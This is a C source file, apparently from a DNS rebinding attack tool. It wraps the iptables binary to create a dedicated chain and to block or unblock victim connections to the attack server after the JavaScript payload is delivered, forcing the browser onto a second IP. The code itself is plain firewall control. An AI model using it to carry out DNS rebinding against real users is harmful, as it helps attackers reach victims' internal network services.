/* This is a wrapper library for calling the iptables binary. It's not an elegant solution, but it's simple, 
 * easy, and it works. Clients need to be blocked on the attack server port after they get the JavaScript
 * payload. This forces the client browser to switch to the second IP that was specified in the DNS response.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include "common.h"
#include "iptables.h"

/* Execute the iptables binary to apply firewall rule changes */
int iptables_exec(char *const args[])
{
	pid_t pid = 0;
	int status = 0;
	int fp = 0;

	pid = fork();
	if(pid < 0){
		perror("Fork() failed");
		return IPTABLES_FAIL;
	} else if(pid == 0){
		/* Redirect stderr and stdout to bit bucket */
		if((fp = open(BIT_BUCKET,(O_RDWR | O_CREAT),O_APPEND)) < 0){
			glog("Failed to open bit bucket for iptables redirection",LOG_ERROR_TYPE);
			exit(EXIT_FAILURE);
		}
		dup2(fp,STDOUT_FILENO);
		dup2(fp,STDERR_FILENO);
		close(fp);

		/* Execute iptables. If it returns, there was an error. */
		execvp(IPTABLES,args);
		glog("Failed to execute iptables command",LOG_ERROR_TYPE);
		exit(EXIT_FAILURE);
	}

	/* Wait for child process to exit and check return status */
	waitpid(pid,&status,0);
	if(WIFEXITED(status)){
		if(WEXITSTATUS(status) == EXIT_SUCCESS){
			return IPTABLES_OK;
		}
	}
	
	return IPTABLES_FAIL;
}

/* Creates the IPTABLES_REBIND_CHAIN chain */
int iptables_init()
{
	char *new_chain[4] = { 0 };
	char *input_rule[6] = { 0 };

	/* Create new chain */
	new_chain[0] = IPTABLES;
	new_chain[1] = IPTABLES_NEW_CHAIN;
	new_chain[2] = IPTABLES_REBIND_CHAIN;

	/* Link new chain with INPUT chain */
	input_rule[0] = IPTABLES;
	input_rule[1] = IPTABLES_APPEND;
	input_rule[2] = IPTABLES_INPUT;
	input_rule[3] = IPTABLES_JUMP;
	input_rule[4] = IPTABLES_REBIND_CHAIN;

	if(iptables_exec(new_chain) == IPTABLES_OK){
		if(iptables_exec(input_rule) == IPTABLES_OK){
			return iptables_flush();
		}
	}

	return IPTABLES_FAIL;
}

/* Flush the rules for the IPTABLES_REBIND_CHAIN chain */
int iptables_flush()
{
	char *args[4] = { 0 };

	args[0] = IPTABLES;
	args[1] = IPTABLES_FLUSH;
	args[2] = IPTABLES_REBIND_CHAIN;
	
	return iptables_exec(args);
}

/* Block new connections that match the supplied parameters */
int iptables_block(char *src_ip, char *dst_ip, int dst_port, char *protocol)
{
	char *args[17] = { 0 };
	char port[SHORT_STR_LEN+1];

	memset((void *) &port,0,SHORT_STR_LEN+1);
	sprintf((char *) &port,"%d",dst_port);
	
	args[0]  = IPTABLES;
	args[1]  = IPTABLES_APPEND;
	args[2]  = IPTABLES_REBIND_CHAIN;
	args[3]  = IPTABLES_PROTO;
	args[4]  = protocol;
	args[5]  = IPTABLES_SRC_IP;
	args[6]  = src_ip;
	args[7]  = IPTABLES_DST_IP;
	args[8]  = dst_ip;
	args[9]  = IPTABLES_DST_PORT;
	args[10] = (char *) &port;

	/* This function is only used for blocking TCP connections, so IPTABLES_SYN is OK for now */
	args[11] = IPTABLES_SYN;
	args[12] = IPTABLES_JUMP;
	args[13] = IPTABLES_REJECT;
	args[14] = IPTABLES_REJECT_WITH;

	/* Use RST packets for TCP and ICMP port unreachable packets for everything else */
	if(memcmp(protocol,IPTABLES_PROTO_TCP,strlen(IPTABLES_PROTO_TCP)) == 0){
		args[15] = IPTABLES_TCP_RESET;
	} else {
		args[15] = IPTABLES_ICMP_REJECT;
	}
	
	return iptables_exec(args);	
}

/* Remove a previously created firewall rule. Only works with TCP for the moment! */
int iptables_unblock(char *src_ip, char *dst_ip, int dst_port, char *protocol)
{
	char *args[17] = { 0 };
	char port[SHORT_STR_LEN+1];

	memset((void *) &port,0,SHORT_STR_LEN+1);
        sprintf((char *) &port,"%d",dst_port);

	args[0] = IPTABLES;
	args[1] = IPTABLES_RULE_DELETE;
	args[2] = IPTABLES_REBIND_CHAIN;
	args[3] = IPTABLES_SRC_IP;
	args[4] = src_ip;
	args[5] = IPTABLES_PROTO;
	args[6] = protocol;
	args[7] = IPTABLES_DST_PORT;
	args[8] = (char *) &port;
	args[9] = IPTABLES_DST_IP;
	args[10] = dst_ip;
	args[11] = IPTABLES_SYN;
	args[12] = IPTABLES_JUMP;
	args[13] = IPTABLES_REJECT;
	args[14] = IPTABLES_REJECT_WITH;

	if(memcmp(protocol,IPTABLES_PROTO_TCP,strlen(IPTABLES_PROTO_TCP)) == 0){
		args[15] = IPTABLES_TCP_RESET;
	} else {
		args[15] = IPTABLES_ICMP_REJECT;
	}
	
	return iptables_exec(args);
}

/* Destroy the IPTABLES_REBIND_CHAIN chain */
int iptables_destroy()
{
	char *del_input_rule[6] = { 0 };
	char *del_chain[4] = { 0 };

	/* Flush the IPTABLES_REBIND_CHAIN rules */
	iptables_flush();

	/* Delete the INPUT rule that links to the IPTABLES_REBIND_CHAIN chain */
	del_input_rule[0] = IPTABLES;
	del_input_rule[1] = IPTABLES_RULE_DELETE;
	del_input_rule[2] = IPTABLES_INPUT;
	del_input_rule[3] = IPTABLES_JUMP;
	del_input_rule[4] = IPTABLES_REBIND_CHAIN;

	/* Delete the IPTABLES_REBIND_CHAIN chain */
	del_chain[0] = IPTABLES;
	del_chain[1] = IPTABLES_CHAIN_DELETE;
	del_chain[2] = IPTABLES_REBIND_CHAIN;

	if(iptables_exec(del_input_rule) == IPTABLES_OK){
		return iptables_exec(del_chain);
	}

	return IPTABLES_FAIL;
}
